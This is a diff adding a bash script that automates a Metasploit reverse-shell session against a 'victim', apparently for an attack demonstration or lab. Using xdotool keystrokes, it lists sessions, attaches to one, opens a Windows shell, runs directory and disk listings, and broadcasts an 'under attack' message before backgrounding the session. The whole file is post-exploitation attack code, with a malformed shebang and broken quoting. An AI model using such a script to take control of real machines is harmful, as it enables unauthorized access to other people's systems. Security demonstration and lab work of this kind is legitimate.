@@ -1,0 +1,26 @@
+!/bin/bash
+###############################
+# Script to take control of the victim via Reverse Shell session
+# The commands using metasploit for the Reverse Shells are
+# sessions -l                              <--- list all victims sessions
+# sessions -i 1                            <--- connect to victim in session 1
+# shell                                    <--- start Windows shell
+###############################
+echo "Wait for the end of Victim1 Attack script..."
+xdotool windowactivate `cat /tmp/attack_window`
+xdotool type --window `cat /tmp/attack_window` --delay 100 "sessions -l"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "sessions -i 1"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "shell"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 2
+xdotool type --window `cat /tmp/attack_window` --delay 100 "ls -la"; xdotool key --window `cat /tmp/attack_window` Return
+xdotool type --window `cat /tmp/attack_window` --delay 100 "df -h"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 5
+xdotool type --window `cat /tmp/attack_window` --delay 100 "wall "!!!!!!!!!!!!!!!!!!!!!!!!!!!! YOU ARE UNDER ATTACK !!!!!!!!!!!!!!!!!!!!!!!!!!!""; xdotool key --window `cat /tmp/attack_window` Return
+sleep 2
+xdotool type --window `cat /tmp/attack_window` --delay 100 "exit"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "background"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+echo "Victim1 Attack Done."
